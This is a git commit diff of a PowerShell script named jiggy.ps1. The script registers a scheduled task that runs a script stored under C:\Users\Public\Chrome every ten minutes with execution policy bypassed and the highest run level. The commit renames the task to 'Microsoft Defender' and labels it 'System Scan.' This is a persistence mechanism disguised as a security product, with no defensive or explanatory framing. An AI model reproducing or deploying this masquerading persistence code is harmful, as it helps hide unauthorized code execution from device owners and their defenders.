5ac53952dcfa1fbd59cd51adbda0fdee6ba2b26b
Mxfire0324 <162410399+Mxfire0324@users.noreply.github.com>
2024-03-06 16:04:58 +0530

    updated

--- jiggy.ps1
+++ jiggy.ps1
@@ -3,5 +3,5 @@ $scriptPath = "C:\Users\Public\Chrome\chrome.ps1"
 
 # Create a new scheduled task
 $action = New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`""
-$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 10) -RepetitionDuration ([timespan]::MaxValue)
-Register-ScheduledTask -TaskName "Windows Defender" -Trigger $trigger -Action $action -RunLevel Highest
+$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 10)
+Register-ScheduledTask -TaskName "Microsoft Defender" -Action $action -Trigger $trigger -Description "System Scan." -ErrorAction Stop
